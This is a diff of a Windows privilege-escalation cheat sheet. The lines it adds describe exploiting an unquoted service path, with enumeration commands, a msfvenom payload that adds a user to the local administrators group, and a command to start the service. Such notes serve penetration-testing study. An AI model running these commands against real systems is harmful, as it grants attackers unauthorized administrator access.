@@ -45,11 +45,16 @@ https://lolbas-project.github.io/#
 Dangerous perms: SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS 
 
     sc qc [service name]  
-### Unquoted Service Paths
+### Unquoted Service Paths   
+Need unquoted service path and ability to start service 
     wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" 2>nul |findstr /i /v """   
     sc qc [service name]        #to check what account service runs under 
     powershell "get-acl -Path 'C:\Program Files (x86)\Service Folder' | format-list"     #to check dir perms 
+    
+Generate exe and upload   
 
+    msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe  
+    sc start service  
 ### Weak Registry Permissions
 ### Insecure Service Executables 
     accesschk.exe -uwcqv "Everyone" *
